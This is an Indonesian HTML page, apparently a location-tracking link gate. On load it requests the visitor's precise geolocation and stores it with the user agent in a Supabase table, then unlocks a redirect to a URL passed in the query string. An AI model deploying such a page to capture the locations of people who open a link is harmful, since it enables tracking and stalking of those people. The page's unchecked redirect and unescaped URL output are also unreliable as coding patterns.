<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Location Consent</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    :root { color-scheme: dark light; }
    body{
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center;
      background: radial-gradient(circle at top, #4f46e5 0, #020617 45%, #000 100%);
      color:#e5e7eb; padding:24px;
    }
    .card{
      background: rgba(15, 23, 42, 0.95);
      border-radius: 16px;
      padding: 1.25rem 1.5rem;
      max-width: 560px; width:100%;
      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
      border: 1px solid rgba(148, 163, 184, 0.3);
    }
    h1{ margin:0 0 .4rem; font-size:1.2rem; }
    p{ margin:.3rem 0; font-size:.92rem; color:#9ca3af; line-height:1.45; }
    .row{ display:flex; gap:10px; flex-wrap:wrap; margin-top:12px; }
    button{
      padding:10px 12px; border-radius:12px;
      border:1px solid rgba(99, 102, 241, 0.35);
      background: rgba(99, 102, 241, 0.28);
      color:#e5e7eb; font-weight:800; font-size:.9rem;
      cursor:pointer;
    }
    button:disabled{opacity:.55; cursor:not-allowed}
    .status{
      margin-top: 1rem; padding: .75rem; border-radius: .75rem;
      background: rgba(2, 6, 23, 0.35);
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono","Courier New", monospace;
      font-size: .78rem; max-height: 220px; overflow:auto;
      border: 1px solid rgba(55, 65, 81, 0.8);
      white-space: pre-wrap; word-break: break-word;
    }
    code{ font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono","Courier New", monospace; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Izinkan lokasi untuk melanjutkan</h1>
    <p>Browser akan meminta izin lokasi. Jika disetujui, lokasi akan disimpan dan kamu bisa lanjut ke tujuan.</p>
    <p id="dest"></p>

    <div class="row">
      <button id="go" disabled>Lanjut</button>
    </div>

    <div id="status" class="status">Memulai…</div>
  </div>

  <script src="https://unpkg.com/@supabase/supabase-js@2/dist/umd/supabase.js"></script>
  <script>
    const statusEl = document.getElementById("status");
    const destEl = document.getElementById("dest");
    const goBtn = document.getElementById("go");

    function log(msg){
      statusEl.textContent += "\\n" + msg;
      statusEl.scrollTop = statusEl.scrollHeight;
    }

    // ====== PAKAI PUNYAMU ======
    const SUPABASE_URL = "https://yfwnfaocsswqerhgxkto.supabase.co";
    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inlmd25mYW9jc3N3cWVyaGd4a3RvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjUyNjE3MTksImV4cCI6MjA4MDgzNzcxOX0.8ADF4wgcEv_lI2qOPcDt1OujckrIBoDYE52wIE8YZEM";
    // ===========================
    const client = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    function getRedirectUrl(){
      const u = new URL(location.href);
      const to = u.searchParams.get("to");
      if (to) { try { return new URL(to).toString(); } catch { return null; } }

      const saved = localStorage.getItem("tracker_redirect");
      if (saved) { try { return new URL(saved).toString(); } catch { return null; } }

      return null;
    }

    const REDIRECT_URL = getRedirectUrl();
    destEl.innerHTML = REDIRECT_URL
      ? `Tujuan: <code>${REDIRECT_URL}</code>`
      : `Tujuan belum diset (pakai parameter <code>?to=</code> atau set default di landing).`;

    let canRedirect = false;

    async function requestLocation(){
      if (!REDIRECT_URL){
        log("Tidak ada redirect URL.");
        return;
      }
      if (!navigator.geolocation){
        log("Geolocation tidak didukung di browser ini.");
        return;
      }

      log("Meminta izin lokasi dari browser…");
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const payload = {
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            user_agent: navigator.userAgent
          };

          log("Lokasi didapat. Menyimpan…");

          const { error } = await client.from("locations").insert(payload);

          if (error){
            log("Gagal simpan: " + error.message);
            return;
          }

          log("Berhasil simpan. Klik 'Lanjut' untuk menuju tujuan.");
          canRedirect = true;
          goBtn.disabled = false;
        },
        (err) => log("Gagal ambil lokasi: " + err.message),
        { enableHighAccuracy:true, timeout:10000, maximumAge:0 }
      );
    }

    goBtn.addEventListener("click", () => {
      if (canRedirect && REDIRECT_URL) window.location.href = REDIRECT_URL;
    });

    // otomatis minta izin saat halaman dibuka (tanpa tombol “Mulai”)
    window.addEventListener("DOMContentLoaded", () => {
      statusEl.textContent = "Inisialisasi…";
      requestLocation();
    });
  </script>
</body>
</html>
